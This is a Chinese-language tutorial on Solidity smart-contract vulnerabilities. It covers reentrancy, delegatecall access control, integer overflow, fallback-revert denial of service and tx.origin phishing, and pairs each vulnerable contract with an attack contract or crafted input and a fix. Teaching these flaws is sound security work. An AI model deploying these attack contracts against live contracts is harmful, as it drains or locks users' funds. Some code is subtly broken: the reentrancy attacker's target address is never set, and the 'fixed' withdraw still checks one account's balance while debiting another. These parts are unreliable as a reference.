## 重入漏洞-Reentrancy

被攻击合约代码：

    
    
    pragma solidity ^0.4.10;
    
    contract Wallet {
        // mapping the account and balance
        mapping (address => uint256) balances;
        
        // recive the money
        function deposit() payable public { 
            // set adress => balance mapping
            balances[msg.sender] += msg.value;
        }
        
        function withdraw(address to, uint256 amount) public {
            // require the balance no less than the withdraw money
            require(balances[to] > amount);
            require(address(this).balance > amount);
            
            // send money, then update the balance
            to.call.value(amount)();
            balances[msg.sender] -= amount;
        }
        
        
        function () public payable { }
    }
    

攻击代码：

首先，调用`sendValue`函数向目标合约转账，创建一个账户。

然后，调用`attack`函数发起取款申请。

目标合约转账后会调用攻击合约的`fallback`函数，发起重入攻击。

    
    
    pragma solidity ^0.4.10;
    
    contract Attack {
        // address of aim contract
        address attackAim;
        
        // send 2 ether to register account
        function sendValue(address aimAddress) public payable {
            // send 2 ether
            aimAddress.call.value(2000000000000000000)(bytes4(keccak256("deposit()")));
        }
        
        function attack(address aimAddress, uint256 value) public payable returns (bool) {
            // withdraw ether from aim contract
            aimAddress.call(bytes4(keccak256("withdraw(address,uint256)")), this, value);
        }
        
        function () public payable {
            // attack function: recursively get 1 ether
            attackAim.call(bytes4(keccak256("withdraw(address,uint256)")), this, 1000000000000000000);
        }
    }
    

攻击原理：

1.给合约账户转账时，会调用目标账户的`fallback`函数

2.被攻击合约采取的是“先转账，后记录”的执行顺序

3.被攻击合约采用`to.call.value(amount)();`函数进行转账，这个函数如果不作`gas`限制的话，会将剩余的`gas`全部给予外部`fallback`函数调用

漏洞修复：

1.将`withdraw`函数的代码修改如下，变成“先记录，后转账”的模式。

2.采用`transfer()`函数进行转账，或采用`to.call.gas(2300).value(amount)();`函数对`gas`进行限制。

    
    
    function withdraw(address to, uint256 amount) public {
        // require the balance no less than the withdraw money
        require(balances[to] > amount);
        require(address(this).balance > amount);
        
        // update the balance, then send money
    		balances[msg.sender] -= amount;
        to.call.value(amount)();
    }

## 越权访问-AcessControl

目标代码：

    
    
    pragma solidity ^0.4.10;
    
    contract Aim {
        address public owner;
     
        constructor () public {
    				// set the owner while building the contract
            owner = msg.sender;
        }
        
        function withDelegateCall(address _address, string _funcName) public {
    				// call the _address._funcName
            _address.delegatecall(bytes4(keccak256(_funcName)));
        }
    }
    

攻击代码：

    
    
    pragma solidity ^0.4.10;
    
    contract Attack {
        address public owner;
        
        function attack() public {
    				// reset the owner of the aim contract
            owner = msg.sender;
        }
    }
    

攻击原理：

1.向被攻击合约的`withDelegateCall`函数传入攻击合约的地址`address`以及攻击函数`attack()`函数。

2.被攻击合约采用`delegatecall`函数，将`_address, _funcName`所对应的函数放在被攻击合约的环境中执行。

3.攻击合约中的`attack`函数对两个合约都存在的`owner`参数进行重新赋值，值为调用被攻击合约`withDelegateCall`函数的地。

漏洞修复：

1.对输入参数（如：`_address, _funcName`）进行限制。

2.根据场景选择合适的调用函数（ **`<address>.call(), <address>.delegatecall(),
<address>.callcode`**）。

## 整数溢出-IntegerOverflow

### 案例1

漏洞代码：

    
    
    pragma solidity ^0.4.10;
    
    contract IntOverflow{
        uint256 public accountBalance;
        
        // withdraw ether
        function withdraw(uint256 _value){
            accountBalance = 20;
            require(accountBalance - _value > 0);
            /*
                send ether ...
            */
        }
    }
    

攻击方法：

向`withdraw`函数传入大于`accountBalance`的参数`_value`，使得`accountBalance -_value`的结果为正数（发生整数溢出）

1.向`withdraw`函数传入参数`_value`：`115792089237316195423570985008687907853269984665640564039457584007913129639926`

`2.accountBalance - _value`发生整数溢出，得到结果为`30`

3.顺利通过`require`检测，执行下面的代码，发送价值为`_value`的以太。

漏洞修复：

将代码中的require语句改为require(accountBalance > _value);，避免了加减运算所造成的整数溢出。

相关知识：

> 8 位无符整数 255 在内存中占据了 8bit 位置，若再加上 1 整体会因为进位而导致整体翻转为 0，最后导致原有的 8bit 表示的整数变为 0.
>
> 如果是 8 位有符整型，其可表示的范围为
>
> `[-128, 127]`
>
> ，最高位作为符号位，当 127 加上 1 时，由于进位符号位变为 1（负数），因为符号位已翻转为 1，通过还原此负数值，最终得到的 8 位有符整数为
> -128（因为0只需要一个，所以把-0拿来当做一个最小的数）。
>
> Solidity 中 uint 默认为 256 位无符整型，可表示范围
>
> `[0, 2**256-1]﻿`

### 案例2

漏洞代码：

    
    
    pragma solidity ^0.4.10;
    
    contract OverflowLoop{
        uint256 public count;
        
        function OFloop2(uint256[] _array) public {
            count = 0;
            for(uint8 i = 0; i < _array.length; i++){
                count++;
            }
        }
    }
    
    contract attack{
        uint256[300] attackArray;
        
        function toAttack(address _aim) public {
            _aim.call(bytes4(keccak256("OFloop2(uint256[])")), attackArray);
        }
    }
    

攻击方法：

1.往`OFloop2`函数中传入长度大于`255`的数组。

2.会使得`for`循环中的`uint8 i`发生整型溢出，`i`不可能大于等于数组长度，永远满足循环条件。

3.一直循环，直到消耗完`gas limit`限制的`gas`。

漏洞修复：

对输入进行检测，限制数组的长度，如`require(_array.length < 255);`。

## 拒绝服务-DenialOfService

目标代码：

    
    
    pragma solidity ^0.4.10;
    
    contract Aim {
        address public owner;
        uint256 public price;
        
        constructor () payable{
            owner = msg.sender;
            price = msg.value;
        }
        
    		// to be the new owner if the msg.value is more than the price
        function toBeOwner() payable {
            require(msg.value > price);
    				// attack happens
            owner.transfer(price);
            owner = msg.sender;
            price = msg.value;
        }
    }
    

攻击代码：

    
    
    pragma solidity ^0.4.10;
    
    contract Attack{
        function attack(address _target) payable{
            _target.call.value(msg.value)(bytes4(keccak256("toBeOwner()")));
        }
        
        function () payable {
    				// the operation would be reverted while sending the ether to this contract
            revert();
        }
    }
    

攻击原理：

`1.revert`函数会抛出错误，然后将此次交易的全部操作通通回滚。

2.只要攻击合约成为目标合约的`owner`，将拒绝新的用户成为目标合约的`owner`。

3.后面再有想成为`owner`的用户，当`owner.transfer(price);`语句执行时，目标合约转账给攻击合约，调用攻击函数的`fallback`函数中的`revert`函数，整个交易进行回滚。

漏洞修复：

让用户自己来取钱，而不是自动的转移资金到用户的账户中。

## 发起者-tx.origin

漏洞代码：

    
    
    pragma solidity ^0.4.10;
    
    contract Wallet {
        address public owner;
        
        constructor () payable{
            // set Wallet's owner
            owner = msg.sender;
        }
        
        function withdraw(address to, uint256 amount) public{
            // require the transaction initiator is Wallet's owner
            require(tx.origin == owner);
            require(this.balance > amount);
            
            // send 1 ether
            to.call.value(1000000000000000000)(amount);
        }
        
        function () payable public{ }
    }
    

攻击代码：

    
    
    pragma solidity ^0.4.10;
    
    contract attack{
        address public txOrigin;
        address public msgSender;
        
        function () payable public{
            // Wallet's owner address
            txOrigin = tx.origin;
            // Wallet address
            msgSender = msg.sender;
            
            msgSender.call(bytes4(keccak256("withdraw(address,uint256)")), this, 1000000000000000000);
        }
    }
    

攻击原理：

1.部署攻击合约。

2.引诱钱包合约的拥有者对攻击合约发起转账，然后调用攻击合约的`fallback`函数。

3.此时，攻击合约的`fallback`函数中，`txOrigin`的值为合约的拥有者的地址，`msgSender`的值为钱包合约的地址。

4.接下来递归调用钱包合约中的`withdraw`函数，直到钱包合约余额小于`1 ether`。（重入攻击）

漏洞修复：

1.采用`transfer`函数进行转账操作，只提供`2300gas`，没有多余的`gas`用来执行目标账户`fallback`函数中的内容。

2.将检查语句`require(tx.origin == owner);`改为`require(msg.sender == owner);`。

